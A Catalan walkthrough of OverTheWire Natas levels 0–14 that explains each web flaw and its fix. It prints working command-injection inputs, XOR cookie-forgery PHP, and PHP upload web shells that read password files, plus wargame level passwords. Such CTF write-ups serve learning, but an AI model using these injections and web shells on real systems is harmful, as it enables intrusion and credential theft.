
-**level 0**

Cliquem a la url que ens apareix i hi entrem amb les credencials que ens donen:

![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/46820382-c276-423b-b664-54ce91bfc6e6)
  
Mirem el codi font i allà trobem la password per el level 1

![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/226c6b07-eb18-43de-9473-1872776be6c2)

``g9D9cREhslqBKtcA2uocGHPfMZVzeFK6``

**Error:** tenir la contrasenya hardcoded a l’HTML a dins d’un comentari

-**level 1**

Aquí han bloquejat el click dret només al requadre blanc, a la resta de la pàgina no.

Per anar al level 2 ens passa el mateix, si mirem el codi font amb ctrl + u veiem la password de natas2:

![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/04f8e892-e5a9-4f2e-97fc-45e39eec0461)


``h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7``

**Error:** tenir la contrasenya hardcoded a l’HTML a dins d’un comentari i per molt que bloquejin el click dret sempre podrem accedir al codi font.


-**level 2:**

Podem veure que per veure el codi font de la pàgina també podem posar view-source davant de qualsevol url:


![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/eb298805-d087-4fb6-bbc2-54f56fc85505)
  

  
Ara al codi font hi veiem la password de natas2, però podem veure si ens hi fixem que a la linia 10 hi ha un div que carrega una imatge de la carpeta files:


![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/7a28ace3-1290-494d-9566-b1cf93ec57d6)



I si anem al directori files:

![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/c52e5e86-6a5f-4a06-9aef-25092ffee865)


  
Hi ha un fitxer.txt amb els usuaris i contrasenyes:

![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/acd7019a-8410-442a-bf08-39575dbeb9c1)

  
**Error:** Al servidor Apache tenen posada l’opció +indexes i degut a això podem veure aquest directori, la solució és anar al virtualhost d’aquesta pagina i al +indexes posar-hi en comptes d’un + un -.

Tampoc han amagat la versió del servidor de producció. Mai s’han de deixar els Apaches de serie.

-**Level 3**:


![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/d9e55139-d9a0-41cb-86bf-a20318b1958d)



No veiem res, anirem a mirar si existeix el fitxer robots.txt:


![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/fa890ebf-d711-447d-81b0-9d727661b07d)



Primer ens especifica qui (al haver-hi un asterisc vol dir que per tots els robots) els hi veta que puguin entrar a s3cr3t, gràcies a això a Google no hi està indexat aquest directori. Nosaltres hi entrarem:


![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/bc55b2f2-6a2f-48c6-906a-479fcc7f0eef)


I tornem a veure un fitxer users.txt que conté la password del següent nivell.

Podriem haver trobat el directori si no amb dirbuster o gobuster.


![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/a1ab1a78-5a98-402f-ab01-98be03238ed6)

  
``tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm``

**L’error** és l’indexes de l’Apache que mostra el contingut del directori. Han fet bé lo del robots però continua fallant l’indexes.

  
-**Level 4**

Ara utilizem el BurpSuite per fer aquest nivell.

  
![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/45078849-632f-4dd4-a42e-841fed8a5f14)


Ara interceptem la petició ja que hem clicat a Refresh page:


![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/717c3ad7-b046-4c4f-973e-468ddc12ae94)
 

Com que se’ns demana provenir de la pàgina natas5, a Referer canviem el 4 per el 5 i fem forward:
  

![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/6cfe520c-7580-48b7-9e06-a672d4ecda1c)



I ara ja se’ns mostra la password per accedir a natas5:


![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/30f59982-7a38-4450-83f2-12667cad9696)
  

  
``Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD``


**Error:** es pot interceptar la petició i canviar manualment el número de la pàgina de la qual se’ns demana venir.
  
-**Level 5**

Interceptem la petició amb burpsuit, i veiem un missatge a la pàgina que ens diu que no estem loguejats:


![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/c40f13c4-c81a-4a9e-9df2-f6e9174b8e18)


Al interceptar-lo veiem que la cookie que controla el login està a 0:

  

![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/cd79057d-d63d-42d4-a20a-8f7868b0c399)



Si la posem a 1, actua com un boleà i ens permet fer login:


![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/82398407-4f70-4444-9d15-6138e2a76cc5)


Cliquem forward i se’ns mostra la contrasenya per accediral level 6:


![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/bf3727a9-2971-4543-a787-f87f3bce00b9)
 

``fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR``


**L’error** és que des de la pròpia cookie de la pàgina web podem modificar l’estat de login nostre i podem sense estar loguejats canviar-nos l’estat a loguejat, és a dir, podem enganyar l’estat del login.

-**Level 6**

Ara tenim la pantalla següent:

![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/ff8d4b15-4fdf-4612-beca-68f797bd2fbc)
 

Amb un camp d’input on s’ha de posar un secret, ens donen un enllaç per veure el codi font:


![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/d655e860-35ba-489c-ae12-8d47794bd8ad)
 

Aquí veiem un codi PHP, a include veiem la ruta on podem trobar el secret, i si ens hi fixem si tenim el secret se’ns pintarà la password de natas 7.

Per tant anem al directori includes/secret.inc i fem ctrl +u i aconseguim el secret:

``FOEIUWGHFEEUHOFUOIU``

Ara posem el secret que hem trobat a l’input i així se’ns mostrarà la contrasenya de natas 7:

![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/7dbf0964-9edd-4701-a19e-e3137388373c)
  

  

![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/fb68adaf-070d-4c44-9dcd-0dfbbb75bd5b)


  
``jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr``

**L’error** és que tenia aquest codi PHP amb la ruta on trobar el secret. Ho hem pogut fer al tenir el codi de la web, és a dir l’error es no haver securitzat el secret.inc i tenir-lo accessible per tothom.


-**Level 7**

Veiem una pàgina que té indexat una altra pàgina, una Home i una About:


![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/8cc52c51-2055-426d-ba58-db06a3852187)


Fem un ctrl + u i veiem que carrega les pàgines amb un argument, per tant aquí podrem injectar:

  

![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/c9019466-5abc-4141-8aaf-e0f1ed5beaf3)


  

![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/19befab7-b50e-48ea-8dee-6b6b749e5a39)
  

Com veiem ens donen una ruta, és un pass traversal per això mai s’ha de passar com a argument a la url el destí on hem d’anar:

![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/dcedd09d-28ab-40ad-8244-9575743fa77d)


I ja tenim la password:

``a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB``

**L’error** és accedir per un paràmetre a la URL. Es podria protegir el directori perquè no s’hi pugui accedir, es podrien descartar caràcters com per exemple fer que no es puguin posar barres amb un regex, sanejar l’entrada seria.

-**Level 8**


Veiem una pàgina amb un input com al Level 6:


![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/6e5fbab9-b2f4-4cb4-97f8-0c4f71453627)


  
I un enllaç per veure el codi font i hi podem veure el codi PHP:


![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/f1b7745b-b424-41e7-b113-bed71a98f16c)
 

  

Ara aquí tenim el secret encriptat. Veiem una funció que diu encode secret, en principi hem de poder fer un invers. **L’error** és: no tots els codis d’encriptació són desxifrables però aquest ho és.

Fem un programa per desencriptar-ho:

![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/637c913f-8d3e-405b-baed-2c3e5a0b8003)
  


I tenim el resultat: ``oubWYf2kBq``

Ara ja tenim el secret i el posem a l’input:

![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/09593ee7-d8c3-46a7-b199-0b566ed95c7d)


I ja tenim la password:

``Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd``

![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/95353466-6c10-4366-9124-2db90ed0f2a4)
 

-**Level 9:**

Si mirem el codi font no en treiem res am ctrl+u, per tant cliquem a View sourcecode:

![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/b2a82934-1009-4b25-9142-2c1eb3aa3d68)
 

I ara sí que veiem el codi:

![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/0245c95e-6ee0-492a-be6f-976aad8038b5)
 

Ens haurem de barallar amb grep, -i vol dir que ens ho busqui ant amb majúscules com amb minúscules. Si poem a ens troba tot de paraules que contenen la paraula a:


![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/241943f4-c732-4785-9f0b-52bfcbce506e)
 

Tal i com està feta la pàgina està feta per no deixar-nos sortir del diccionari.

A nivell de bash script hem de separar i posar dues comandes amb ; que executarà grep -i després ; i després executarà la comanda que nosaltres vulguem. Posem ;ls /etc/natas_wepass:


![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/eaefa30a-72de-49d2-b463-a89d3884d88a)



El nostre usuari és natas9 i podem accedir al fitxer natas9 i al natas10, aquest últim degut al grup. Hem posat ;cat /etc/natas_webpass/natas10:

![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/8e9e19c4-0637-403b-92f3-032c484ebfcd)


  

``D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE``

**L’error** aquí és no sanejar l’entrada, és a dir no capar els caràcters com /, etc cosa que ens ha permés tallar una comanda i posar-ne una altra a continuació. Al no sanejar-lo ens permet fer una injecció de codi que es renderitza al cantó del servidor. La solució és sanejar caràcters com /.

**Level 10**

![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/d80dae22-796e-44b2-9e78-332c1b42d932)


Al codi font veiem com han anulat el ; la / etc:


![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/fa7f54c8-688e-4548-b57d-db99950e41ad)
 

Primer buscarem un valor vàlid i després li direm al fitxer que volem buscar (en comptes dal ditcionary.txt)

![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/d135b981-a331-4636-b63c-53c88a34faf1)



![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/7b073d1e-2bc2-4a5f-8f52-9f7e510e3afc)


  
``1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg``

I ja tenim la password, hem tingut sort perquè a la contrasenya hi ha una a. Hem d’encertar un dels caràcters de la contrasenya o si no no ens surt, per exemple si ho provem amb la z no ens sortirà la contrasenya.

**L’error** és permetre el caràcter de barra ja que no està securitzat i podem posar rutes alternatives.

-**Level 11**


![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/7162c7ec-418e-4a30-8b30-80bca365458b)
 


Si cliquem a View sourcecode:

![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/5360ab2b-310e-4c05-8494-586b8d7fb1cd)
 


Si la cookie estigués només en base64 la podríem desencriptar amb el burpsuite mateix:

![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/1e3342a2-5dd6-48d1-9e96-c1f46abc638f)


I ja tenim la cookie també:

``MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY%3D``

Necessitem el json: `"showpassword"``=>``"no"``,` `"bgcolor"``=>``"#ffffff"`

La key que ha fet servir per codificar el json i que no coneixem.

I la pròpia cookie que sí que tenim.

Hem d’aconseguir fer json XOR cookie= key ja que és l'invers del que fa la codificació original que és: json XOR key =cookie i així podrem reproduir el procés i encriptar tal i com ho fa l’script. Amb un XOR podem amb 2 de les 3 informacions aconseguir la restant.

Ara per tant necessitarem un editor de PHP i tirar aquest codi perquè ens doni la key:


``<?php // Enter your code here, enjoy! $json_sting = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff")); $cookie_sting = base64_decode("MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY="); echo ($json_sting ^ $cookie_sting); ?>``

  

![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/95efbeb9-effb-4171-912f-d8b97f92c5b4)
 

  

Ara tenim la key i veiem que és: ``KNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLK``

Ara hem de fer l’encriptació, i obtindrem una cookie que en comtpes de dir showpassord=no posarà showpassword=yes i obtindrem la cookie:

``<?php $data = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"); function xor_encrypt($in) { $key = 'KNHL'; $text = $in; $outText = ''; // Iterate through each character for($i=0;$i<strlen($text);$i++) { $outText .= $text[$i] ^ $key[$i % strlen($key)]; } return $outText; } echo base64_encode(xor_encrypt(json_encode($data))); ?>``


La cookie que ens dona el codi anterior: ``MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz``

Ara canviem la cookie des de Burpsuite per exemple i ja obtenim la contrasenya:


![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/4478fe5e-e4da-40ee-8a5f-9ab1d7d6089b)



![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/a4b97972-9e15-4474-a52f-841a5bd36e06)



``YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG``

**L’error** és encriptar la key amb el mètode XOR que és un mètode reversible i per això podem obtenir la key.


Es podria solucionar fent servir una clau pública i privada per encriptar la cookie.

-**Level 12**

![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/e82eebcd-bfba-4ac6-bcbf-59e951b5836a)
  

```<html>   <head>   <!-- This stuff in the header has nothing to do with the level -->   <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">   <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />   <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />   <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>   <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>   <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>   <script>var wechallinfo = { "level": "natas12", "pass": "<censored>" };</script></head>   <body>   <h1>natas12</h1>   <div id="content">   ``<?php      ``function` `genRandomString``() {`    `$length` `=` `10``;`    `$characters` `=` `"0123456789abcdefghijklmnopqrstuvwxyz"``;`    `$string` `=` `""``;          for (``$p` `=` `0``;` `$p` `<` `$length``;` `$p``++) {`        `$string` `.=` `$characters``[``mt_rand``(``0``,` `strlen``(``$characters``)-``1``)];       }          return` `$string``;   }      function` `makeRandomPath``(``$dir``,` `$ext``) {       do {`    `$path` `=` `$dir``.``"/"``.``genRandomString``().``"."``.``$ext``;       } while(``file_exists``(``$path``));       return` `$path``;   }      function` `makeRandomPathFromFilename``(``$dir``,` `$fn``) {`    `$ext` `=` `pathinfo``(``$fn``,` `PATHINFO_EXTENSION``);       return` `makeRandomPath``(``$dir``,` `$ext``);   }      if(``array_key_exists``(``"filename"``,` `$_POST``)) {`    `$target_path` `=` `makeRandomPathFromFilename``(``"upload"``,` `$_POST``[``"filename"``]);                 if(``filesize``(``$_FILES``[``'uploadedfile'``][``'tmp_name'``]) >` `1000``) {           echo` `"File is too big"``;       } else {           if(``move_uploaded_file``(``$_FILES``[``'uploadedfile'``][``'tmp_name'``],` `$target_path``)) {               echo` `"The file <a href=\"``$target_path``\">``$target_path``</a> has been uploaded"``;           } else{               echo` `"There was an error uploading the file, please try again!"``;           }       }   } else {   ``?>   ``   <form enctype="multipart/form-data" action="index.php" method="POST">   <input type="hidden" name="MAX_FILE_SIZE" value="1000" />   <input type="hidden" name="filename" value="``<?php` `print` `genRandomString``();` `?>``.jpg" />   Choose a JPEG to upload (max 1KB):<br/>   <input name="uploadedfile" type="file" /><br />   <input type="submit" value="Upload File" />   </form>   ``<?php` `}` `?>   ``<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>   </div>   </body>   </html>```

  

Pujem la imatge i deixem passar la petició, estem amb BurpSuite:

![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/75987b96-4a87-41b3-a42e-d5bf7c312af4)


  
I ara la nostra image està a la url que se’ns facilita:


![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/cdabe104-8836-44c8-8f8d-8b9521b4737e)
 


I podem veure la «imatge»:


![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/9f76a32a-e853-47da-af35-117b868b3bf6)
 

![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/b7b8b077-2354-4f15-8217-60f2b70da87c)


Ara el codi font és el següent:

```
`<html>  
<head>  
<!-- This stuff in the header has nothing to do with the level -->  
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">  
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />  
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />  
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>  
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>  
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>  
<script>var wechallinfo = { "level": "natas12", "pass": "<censored>" };</script></head>  
<body>  
<h1>natas12</h1>  
<div id="content">  
<?php  
  
function genRandomString() {  
    $length = 10;  
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";  
    $string = "";  
  
    for ($p = 0; $p < $length; $p++) {  
        $string .= $characters[mt_rand(0, strlen($characters)-1)];  
    }  
  
    return $string;  
}  
  
function makeRandomPath($dir, $ext) {  
    do {  
    $path = $dir."/".genRandomString().".".$ext;  
    } while(file_exists($path));  
    return $path;  
}  
  
function makeRandomPathFromFilename($dir, $fn) {  
    $ext = pathinfo($fn, PATHINFO_EXTENSION);  
    return makeRandomPath($dir, $ext);  
}  
  
if(array_key_exists("filename", $_POST)) {  
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);  
  
  
        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {  
        echo "File is too big";  
    } else {  
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {  
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";  
        } else{  
            echo "There was an error uploading the file, please try again!";  
        }  
    }  
} else {  
?>  
  
<form enctype="multipart/form-data" action="index.php" method="POST">  
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />  
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />  
Choose a JPEG to upload (max 1KB):<br/>  
<input name="uploadedfile" type="file" /><br />  
<input type="submit" value="Upload File" />  
</form>  
<?php } ?>  
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>  
</div>  
</body>  
</html>`
```

  

Veiem que un cop té un nom random i una ruta random fa el path del fitxer pujat amb els valors aquests.

Aquí hem de valorar que ens deixa pujar un arxiu i després veure la ruta, per tant podem veure que el renderitza el servidor i el mostra. Per tant el que haurem de fer és injectar un codi al fitxer.


Provarem de fer un Hello World per exemple:

``<? echo ('hello world!') ?>``


I ara pujarem el fitxer a veure què passa:

```
`POST /index.php HTTP/1.1

Host: natas12.natas.labs.overthewire.org

Content-Length: 432

Cache-Control: max-age=0

Authorization: Basic bmF0YXMxMjpZV3FvMHBqcGNYelNJbDVOTUFWeGcxMlF4ZUMxdzlRRw==

Upgrade-Insecure-Requests: 1

Origin: http://natas12.natas.labs.overthewire.org

Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryc03BpyGwO15ssBN

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://natas12.natas.labs.overthewire.org/

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Cookie: _ga=GA1.1.627158546.1708100915; _ga_RD0K2239G0=GS1.1.1708100914.1.1.1708100926.0.0.0

Connection: close

------WebKitFormBoundaryc03BpyGwO15ssBNP

Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000

------WebKitFormBoundaryc03BpyGwO15ssBNP

Content-Disposition: form-data; name="filename"
xq6qamzrfv.jpg

------WebKitFormBoundaryc03BpyGwO15ssBNP

Content-Disposition: form-data; name="uploadedfile"; filename="image.jpg"

Content-Type: image/jpeg
````



``<? echo ('hello world!') ?>``


``------WebKitFormBoundaryc03BpyGwO15ssBNP--``

  
Ens dona la URL, hi cliquem però seguim sense veure res:


![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/428b6754-6fb5-4576-bf25-df2ea6eeda8c)
 

Per tant al moment d’enviar la petició hem de canviar el format perquè ens interpreti le PHP:


```
`POST /index.php HTTP/1.1

Host: natas12.natas.labs.overthewire.org

Content-Length: 432

Cache-Control: max-age=0

Authorization: Basic bmF0YXMxMjpZV3FvMHBqcGNYelNJbDVOTUFWeGcxMlF4ZUMxdzlRRw==

Upgrade-Insecure-Requests: 1

Origin: http://natas12.natas.labs.overthewire.org

Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzJD8UIUOdPNnAVWd

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://natas12.natas.labs.overthewire.org/

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Cookie: _ga=GA1.1.627158546.1708100915; _ga_RD0K2239G0=GS1.1.1708100914.1.1.1708100926.0.0.0

Connection: close

------WebKitFormBoundaryzJD8UIUOdPNnAVWd

  

Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000

------WebKitFormBoundaryzJD8UIUOdPNnAVWd

Content-Disposition: form-data; name="filename"

xq6qamzrfv.jpg CANVIEM AQUEST .JPG PER .PHP.

------WebKitFormBoundaryzJD8UIUOdPNnAVWd

Content-Disposition: form-data; name="uploadedfile"; filename="image.jpg"

Content-Type: image/jpeg`
```



``<? echo ('hello world!') ?>``

  
``------WebKitFormBoundaryzJD8UIUOdPNnAVWd--``


I ara podem veure el hello world:


![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/576b9157-730a-4a38-9671-75368246fa22)
 

hello world!


Al moment del enviament com que ja ha verificat que çés un jpg, ja no ho torna a verificar i si interceptem la petició podem modificar-ho.

Preparem que ens executi la comanda amb bash que serà la contrasenya mostrada amb echo de natas 13:

``<? echo (exec('cat /etc/natas_webpass/natas13')); ?>``


![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/1a8613e8-495c-47af-afb7-acad04b0ed8f)
 

Tornem a modificar el nom random que ens genera, i l’error és que es genera del cantó del client i podem manipular el nom, si vols del cantó del servidor no tindriem res a fer:

  

![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/a595d889-0084-4ed9-ae74-7a74fc7f8f78)


  

![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/6475b157-b17b-41f9-b430-e7caed1e03e6)



```
`POST /index.php HTTP/1.1

Host: natas12.natas.labs.overthewire.org

Content-Length: 457

Cache-Control: max-age=0

Authorization: Basic bmF0YXMxMjpZV3FvMHBqcGNYelNJbDVOTUFWeGcxMlF4ZUMxdzlRRw==

Upgrade-Insecure-Requests: 1

Origin: http://natas12.natas.labs.overthewire.org

Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrgvYZeoUMqd7Uzw5

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://natas12.natas.labs.overthewire.org/

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Cookie: _ga=GA1.1.627158546.1708100915; _ga_RD0K2239G0=GS1.1.1708100914.1.1.1708100926.0.0.0

Connection: close

------WebKitFormBoundaryrgvYZeoUMqd7Uzw5

Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000

------WebKitFormBoundaryrgvYZeoUMqd7Uzw5

Content-Disposition: form-data; name="filename"

xq6qamzrfv.php

------WebKitFormBoundaryrgvYZeoUMqd7Uzw5

Content-Disposition: form-data; name="uploadedfile"; filename="image.jpg"

Content-Type: image/jpeg`
```

``<? echo (exec('cat /etc/natas_webpass/natas13')); ?>``

``------WebKitFormBoundaryrgvYZeoUMqd7Uzw5--``


**L’error** és que l’string random és genera al costat del client no al servidor. Ara ja tenim la contrasenya de natas13:

![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/458efacf-5b54-46bd-9a8a-b6ec21957a2f)


La contrasenya de natas13:

``lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9``

**L’error** és generar al cantó del client l’string random en comptes de al servidor.

-**Level 13**

Ara sí que ens comprova la imatge, anem a comprovar el codi font:

<html>  
<head>  
<!-- This stuff in the header has nothing to do with the level -->  
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">  
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />  
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />  
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>  
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>  
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>  
<script>var wechallinfo = { "level": "natas13", "pass": "<censored>" };</script></head>  
<body>  
<h1>natas13</h1>  
<div id="content">  
For security reasons, we now only accept image files!<br/><br/>  
  
<?php  
  
function genRandomString() {  
    $length = 10;  
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";  
    $string = "";  
  
    for ($p = 0; $p < $length; $p++) {  
        $string .= $characters[mt_rand(0, strlen($characters)-1)];  
    }  
  
    return $string;  
}  
  
function makeRandomPath($dir, $ext) {  
    do {  
    $path = $dir."/".genRandomString().".".$ext;  
    } while(file_exists($path));  
    return $path;  
}  
  
function makeRandomPathFromFilename($dir, $fn) {  
    $ext = pathinfo($fn, PATHINFO_EXTENSION);  
    return makeRandomPath($dir, $ext);  
}  
  
if(array_key_exists("filename", $_POST)) {  
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);  
  
    $err=$_FILES['uploadedfile']['error'];  
    if($err){  
        if($err === 2){  
            echo "The uploaded file exceeds MAX_FILE_SIZE";  
        } else{  
            echo "Something went wrong :/";  
        }  
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {  
        echo "File is too big";  
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {  
        echo "File is not an image";  
    } else {  
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {  
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";  
        } else{  
            echo "There was an error uploading the file, please try again!";  
        }  
    }  
} else {  
?>  
  
<form enctype="multipart/form-data" action="index.php" method="POST">  
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />  
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />  
Choose a JPEG to upload (max 1KB):<br/>  
<input name="uploadedfile" type="file" /><br />  
<input type="submit" value="Upload File" />  
</form>  
<?php } ?>  
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>  
</div>  
</body>  
</html>


![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/a4865da1-ccd3-491e-badc-9a1c9c2a79a9)



Ara hi ha una funció que comprova que pujem una imatge al codi de la pàgina.

Hem d’investigar el magic numbers, que verifiquen que el fitxer sigui una imatge, i haurem d’intentar enganyar fent que esl primers bits siguin alguns dels magin numbers per intentar enganyar el codi de la pàgina. [File Magic Numbers (github.com)](https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5)


Hem de posar el codi ascii als primers bits del fitxer per intentar enganyar-lo:


![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/1bb7dc48-6870-4399-82f8-fe0ba7410505)


  

``BM;<? echo (exec('cat /etc/natas_webpass/natas14')); ?>``

El servidor comprovarà els primers bits i si li es pensa que és una imatge ens deixarà passar:

Canviem a PHP la petició interceptada amb burpsuite també, igual que abans:

6igbjfy1kx.php

Ens dona el link, hi cliquem i ja tenim la password, que ve amb el BM (ja que ho hem provat amb el format BMP) i li hem de treure:

``BM;qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP``

  

![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/f0289e1f-7b65-43c0-92dc-e835090d710f)


  

**L’error** **és** que el sistema de verificació és una mica fluixet i l’hem aconseguit enredar, heredant evidenment tot lo del nivell anterior.

-**Level 14**

Ara veiem un login, amb un camp per el nom d’usuari i un per la password:

<html>  
<head>  
<!-- This stuff in the header has nothing to do with the level -->  
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">  
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />  
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />  
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>  
